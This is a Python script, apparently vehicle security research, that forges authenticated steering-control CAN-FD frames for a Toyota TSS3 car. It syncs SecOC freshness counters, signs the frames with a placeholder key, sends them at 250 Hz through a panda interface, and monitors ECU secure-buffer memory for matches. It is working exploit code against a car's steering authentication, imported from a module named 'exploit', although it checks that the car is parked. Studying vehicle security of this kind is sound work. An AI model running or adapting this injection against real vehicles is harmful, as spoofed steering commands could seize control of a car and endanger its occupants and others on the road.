import time,threading,collections
from exploit.ephemeral_runtime.camry_f33_runtime_monitor import MonitorSession, decode_secoc_sync, decode_steering_angle_deg
from opendbc.car.toyota.tss3 import *
s=MonitorSession(require_ready_parked=True)
addrs=[0xFEBE5478,0xFEBE54D4,0xFEBE54D8,0xFEBE54DC,0xFEBE54F0,0xFEBE5524,0xFEBE5364,0xFEBE4C00]
for i,a in enumerate(addrs): s.set_watch(i,a)
# seed latest state
for _ in range(60): s.panda.can_recv(); time.sleep(.002)
ang=s.panda.latest(0,0x025); assert ang
raw=target_angle_deg_to_raw(decode_steering_angle_deg(ang[1]))
comp=TSS3B6CompanionFields(signal264_b6_bits6_4=5,additive_term_suppress=0,contribution_pct_1=23,contribution_pct_2=47,signal273_b10_bits2_0=5)
tpl=TSS3B6Template(); stop=threading.Event(); sent=[]; err=[]
def tx():
  seq=0; mc=0; cr=None; dl=time.monotonic()
  try:
    while not stop.is_set():
      row=s.panda.latest(0,0x00F)
      if not row: continue
      sy=decode_secoc_sync(row[1]); r=int(sy['reset_counter'])
      if cr!=r: cr=r; mc=0
      app=build_b6_application(target_lateral_id=63,target_angle_raw=raw,sequence=seq,template=tpl,companions=comp)
      a,d,b=build_b6_secoc_frame(TSS3_B6_DUMMY_SECOC_KEY,app,TSS3Freshness(int(sy['trip_counter']),r,mc))
      s.panda.can_send(a,d,0,fd=True); sent.append(bytes(d)); seq=(seq+1)&63; mc=(mc+1)&255
      dl+=1/250; stop.wait(max(0,dl-time.monotonic()))
  except Exception as e: err.append(repr(e)); stop.set()
rows=[]; e0=s.panda.b6_echo_count(); s.set_running(True); th=threading.Thread(target=tx,daemon=True); th.start(); end=time.monotonic()+0.8
try:
  while time.monotonic()<end:
    st=s.read_state(); vals=[bytes.fromhex(v['bytes_le']) for v in st['values']]
    rows.append((st['sample_generation'], vals))
    time.sleep(.003)
finally:
  stop.set(); th.join(1); s.set_running(False)
print('sent',len(sent),'echo',s.panda.b6_echo_count()-e0,'err',err,'rows',len(rows),'target',raw)
# classify secure buffer states
classes=collections.Counter(); examples={}
for gen,v in rows:
  q=v[0]
  b0_3=v[1]; b4_7=v[2]; b8_11=v[3]; tr=v[4]
  frame12=b0_3+b4_7+b8_11
  key=(frame12[3],frame12[6],frame12[7]&63,frame12[8],frame12[9],tr.hex(),q.hex(),v[5].hex())
  classes[key]+=1; examples.setdefault(key,gen)
print('class count',len(classes))
for k,n in classes.most_common(20): print(n,'gen',examples[k],'B3',k[0],'B6',hex(k[1]),'seq',k[2],'B8/9',k[3],k[4],'tr',k[5],'q',k[6],'state',k[7])
# any exact first12 matches sent first12
sent12={x[:12] for x in sent}; sent4={x[:4] for x in sent}
match12=[]; match4=[]
for gen,v in rows:
  f=v[1]+v[2]+v[3]
  if f in sent12: match12.append((gen,f.hex()))
  if f[:4] in sent4: match4.append((gen,f[:4].hex()))
print('exact first12 matches',match12[:20], 'count',len(match12))
print('exact first4 matches',match4[:20], 'count',len(match4))
